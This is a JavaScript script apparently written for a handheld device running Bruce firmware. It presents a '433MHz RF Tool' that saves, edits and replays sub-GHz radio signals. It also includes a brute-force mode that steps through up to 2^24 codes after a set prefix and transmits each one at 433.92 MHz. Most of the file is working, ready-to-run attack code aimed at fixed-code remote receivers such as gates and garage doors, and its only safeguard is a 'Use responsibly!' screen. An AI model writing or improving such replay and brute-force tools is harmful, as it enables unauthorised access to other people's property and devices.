var display = require('display');
var keyboardApi = require('keyboard');
var dialog = require('dialog');
var subghz = require('subghz');
var storage = require('storage');

// Display functions
var fillScreen = display.fill;
var drawString = display.drawString;

// Input functions
var getAnyPress = keyboardApi.getAnyPress;
var keyboardPrompt = keyboardApi.keyboard;

// Dialog functions
var dialogChoice = dialog.choice;
var dialogError = dialog.error;
var dialogMessage = dialog.message;

// SubGHz function (only transmit is available in Bruce JS API!)
var subghzTransmit = subghz.transmit;

// Storage for saved signals
var saved_signals = [];

// Brute force settings
var brute_settings = {
    prefix: 0x445700,      // Starting value prefix
    bits: 8,               // Number of bits to iterate (2^8 = 256 values)
    delay_ms: 200,         // Delay between transmissions
    frequency: 433920000,  // 433.92 MHz
    te: 174,               // Pulse length
    repeat: 10             // Repeat count per transmission
};

// Load saved signals from storage
function loadSavedSignals() {
    try {
        var data = storage.read('/rf433_saved.json');
        if (data) {
            saved_signals = JSON.parse(data);
            return true;
        }
    } catch (e) {
        // File doesn't exist or invalid JSON
    }
    return false;
}

// Save signals to storage
function saveSavedSignals() {
    try {
        var json = JSON.stringify(saved_signals);
        storage.write('/rf433_saved.json', json);
        return true;
    } catch (e) {
        dialogError("Failed to save: " + e);
        return false;
    }
}

// Display a signal's details
function displaySignal(signal, y_offset) {
    drawString("Name: " + signal.name, 2, y_offset);
    drawString("Data: " + signal.data, 2, y_offset + 12);
    drawString("Freq: " + (signal.frequency / 1000000).toFixed(2) + " MHz", 2, y_offset + 24);
    drawString("TE: " + signal.te + " Repeat: " + signal.repeat, 2, y_offset + 36);
}

// Replay a signal
function replaySignal(signal) {
    fillScreen(0);
    drawString("Transmitting...", 3, 0);
    displaySignal(signal, 16);
    
    // Bruce JS API: subghzTransmit(data, frequency, te, repeat_count)
    var result = subghzTransmit(signal.data, signal.frequency, signal.te, signal.repeat);
    
    if (result) {
        dialogMessage("Signal transmitted!");
    } else {
        dialogError("Transmission failed");
    }
}

// Add a new signal manually
function addSignal() {
    var name = keyboardPrompt("Signal_" + (saved_signals.length + 1), 32, "Enter signal name");
    if (!name || name === "") return;
    
    var data = keyboardPrompt("", 32, "Enter data (hex)");
    if (!data || data === "") return;
    
    var freq_mhz = keyboardPrompt("433.92", 32, "Frequency (MHz)");
    var frequency = parseInt(parseFloat(freq_mhz || "433.92") * 1000000);
    
    var te = keyboardPrompt("174", 32, "TE (pulse length)");
    var te_val = parseInt(te || "174");
    
    var repeat = keyboardPrompt("10", 32, "Repeat count");
    var repeat_val = parseInt(repeat || "10");
    
    var signal = {
        name: name,
        data: data,
        frequency: frequency,
        te: te_val,
        repeat: repeat_val,
        savedAt: Date.now()
    };
    
    saved_signals.push(signal);
    
    if (saveSavedSignals()) {
        dialogMessage("Saved: " + name);
    }
}

// View and manage saved signals
function viewSavedSignals() {
    if (saved_signals.length === 0) {
        dialogMessage("No saved signals");
        return;
    }
    
    while (true) {
        var options = {};
        
        for (var i = 0; i < saved_signals.length; i++) {
            options[saved_signals[i].name] = String(i);
        }
        options["Back"] = "back";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "back") break;
        
        var index = parseInt(choice);
        if (index >= 0 && index < saved_signals.length) {
            manageSavedSignal(index);
        }
    }
}

// Manage a saved signal
function manageSavedSignal(index) {
    var signal = saved_signals[index];
    
    while (true) {
        var options = {};
        options[signal.name] = "header";
        options["Replay"] = "replay";
        options["Edit"] = "edit";
        options["Delete"] = "delete";
        options["Back"] = "back";
        
        fillScreen(0);
        displaySignal(signal, 0);
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "back") break;
        else if (choice === "replay") {
            replaySignal(signal);
        }
        else if (choice === "edit") {
            editSignal(signal);
            saveSavedSignals();
        }
        else if (choice === "delete") {
            saved_signals.splice(index, 1);
            saveSavedSignals();
            dialogMessage("Deleted");
            break;
        }
    }
}

// Edit a signal
function editSignal(signal) {
    var options = {};
    options["Edit Name"] = "name";
    options["Edit Data"] = "data";
    options["Edit Frequency"] = "freq";
    options["Edit TE"] = "te";
    options["Edit Repeat"] = "repeat";
    options["Back"] = "back";
    
    var choice = dialogChoice(options);
    
    if (choice === "name") {
        var new_name = keyboardPrompt(signal.name, 32, "New name");
        if (new_name && new_name !== "") signal.name = new_name;
    }
    else if (choice === "data") {
        var new_data = keyboardPrompt(signal.data, 32, "New data (hex)");
        if (new_data && new_data !== "") signal.data = new_data;
    }
    else if (choice === "freq") {
        var freq_mhz = keyboardPrompt(String(signal.frequency / 1000000), 32, "Frequency (MHz)");
        if (freq_mhz) signal.frequency = parseInt(parseFloat(freq_mhz) * 1000000);
    }
    else if (choice === "te") {
        var te = keyboardPrompt(String(signal.te), 32, "TE (pulse length)");
        if (te) signal.te = parseInt(te);
    }
    else if (choice === "repeat") {
        var repeat = keyboardPrompt(String(signal.repeat), 32, "Repeat count");
        if (repeat) signal.repeat = parseInt(repeat);
    }
}

// Brute force transmit function
function bruteForceAttack() {
    var max_val = brute_settings.prefix + (1 << brute_settings.bits);
    var total = (1 << brute_settings.bits);
    var count = 0;
    
    fillScreen(0);
    drawString("Starting brute force...", 3, 0);
    drawString("Total values: " + total, 3, 16);
    drawString("Hold any key to stop", 3, 32);
    delay(2000);
    
    for (var brute_val = brute_settings.prefix; brute_val < max_val; brute_val++) {
        fillScreen(0);
        var curr_val = brute_val.toString(16).toUpperCase();
        
        count++;
        var percent = Math.floor((count / total) * 100);
        
        drawString("Transmitting " + count + "/" + total, 3, 0);
        drawString("Progress: " + percent + "%", 3, 16);
        drawString("", 3, 32);
        drawString("Value: " + curr_val, 3, 48);
        drawString("Freq: " + (brute_settings.frequency / 1000000).toFixed(2) + " MHz", 3, 64);
        drawString("", 3, 80);
        drawString("HOLD ANY KEY TO STOP", 3, 96);
        
        // Check for stop signal
        if (getAnyPress()) {
            dialogMessage("Attack stopped at " + count + "/" + total);
            return;
        }
        
        // Transmit the current value
        var result = subghzTransmit(curr_val, brute_settings.frequency, brute_settings.te, brute_settings.repeat);
        
        if (!result) {
            fillScreen(0);
            drawString("ERROR at value:", 3, 0);
            drawString(curr_val, 3, 16);
            drawString("Check serial log", 3, 32);
            drawString("Press any key...", 3, 48);
            while (!getAnyPress()) {
                delay(100);
            }
        }
        
        delay(brute_settings.delay_ms);
    }
    
    dialogMessage("Brute force complete! Sent " + total + " values.");
}

// Brute force settings menu
function bruteForceMenu() {
    while (true) {
        var options = {};
        options["=== Brute Force Settings ==="] = "header";
        options["Prefix: 0x" + brute_settings.prefix.toString(16).toUpperCase()] = "prefix";
        options["Range Bits: " + brute_settings.bits + " (" + (1 << brute_settings.bits) + " values)"] = "bits";
        options["Delay: " + brute_settings.delay_ms + " ms"] = "delay";
        options["Frequency: " + (brute_settings.frequency / 1000000).toFixed(2) + " MHz"] = "freq";
        options["TE: " + brute_settings.te] = "te";
        options["Repeat: " + brute_settings.repeat] = "repeat";
        options["--- START ATTACK ---"] = "start";
        options["Back"] = "back";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "back") break;
        else if (choice === "prefix") {
            var input = keyboardPrompt(brute_settings.prefix.toString(16), 32, "Prefix value (hex)");
            if (input) brute_settings.prefix = parseInt(input, 16);
        }
        else if (choice === "bits") {
            var input = keyboardPrompt(String(brute_settings.bits), 32, "Bits to iterate (1-24)");
            if (input) {
                var bits = parseInt(input);
                if (bits >= 1 && bits <= 24) {
                    brute_settings.bits = bits;
                } else {
                    dialogError("Bits must be 1-24");
                }
            }
        }
        else if (choice === "delay") {
            var input = keyboardPrompt(String(brute_settings.delay_ms), 32, "Delay (ms)");
            if (input) brute_settings.delay_ms = parseInt(input);
        }
        else if (choice === "freq") {
            var input = keyboardPrompt(String(brute_settings.frequency / 1000000), 32, "Frequency (MHz)");
            if (input) brute_settings.frequency = parseInt(parseFloat(input) * 1000000);
        }
        else if (choice === "te") {
            var input = keyboardPrompt(String(brute_settings.te), 32, "TE (pulse length)");
            if (input) brute_settings.te = parseInt(input);
        }
        else if (choice === "repeat") {
            var input = keyboardPrompt(String(brute_settings.repeat), 32, "Repeat count");
            if (input) brute_settings.repeat = parseInt(input);
        }
        else if (choice === "start") {
            // Confirm before starting
            fillScreen(0);
            drawString("Ready to transmit:", 3, 0);
            drawString("", 3, 16);
            drawString("Values: " + (1 << brute_settings.bits), 3, 32);
            drawString("Time: ~" + Math.floor(((1 << brute_settings.bits) * brute_settings.delay_ms) / 1000) + " sec", 3, 48);
            drawString("", 3, 64);
            drawString("WARNING: Use responsibly!", 3, 80);
            drawString("", 3, 96);
            drawString("Press any key to start", 3, 112);
            
            while (!getAnyPress()) {
                delay(100);
            }
            
            bruteForceAttack();
        }
    }
}

// Main menu
function mainMenu() {
    loadSavedSignals();
    
    while (true) {
        fillScreen(0);
        
        var options = {};
        options["=== RF 433MHz Tool ==="] = "header";
        options["Saved Signals (" + saved_signals.length + ")"] = "view_saved";
        options["Add New Signal"] = "add";
        options["Brute Force Attack"] = "brute";
        options["Clear All"] = "clear";
        options["Exit"] = "exit";
        
        var choice = dialogChoice(options);
        
        if (choice === "" || choice === "exit") {
            break;
        }
        else if (choice === "view_saved") {
            viewSavedSignals();
        }
        else if (choice === "add") {
            addSignal();
        }
        else if (choice === "brute") {
            bruteForceMenu();
        }
        else if (choice === "clear") {
            if (saved_signals.length > 0) {
                saved_signals = [];
                saveSavedSignals();
                dialogMessage("All signals cleared");
            }
        }
    }
    
    fillScreen(0);
    drawString("RF Tool closed", 3, 0);
    delay(1000);
}

// Info screen
fillScreen(0);
drawString("RF 433MHz Tool", 3, 0);
drawString("", 3, 16);
drawString("Features:", 3, 32);
drawString("- Replay saved signals", 3, 48);
drawString("- Brute force attacks", 3, 64);
drawString("", 3, 80);
drawString("Note: Use RF menu to scan", 3, 96);
drawString("", 3, 112);
drawString("Press any key...", 3, 128);

while (!getAnyPress()) {
    delay(100);
}

// Start the application
mainMenu();
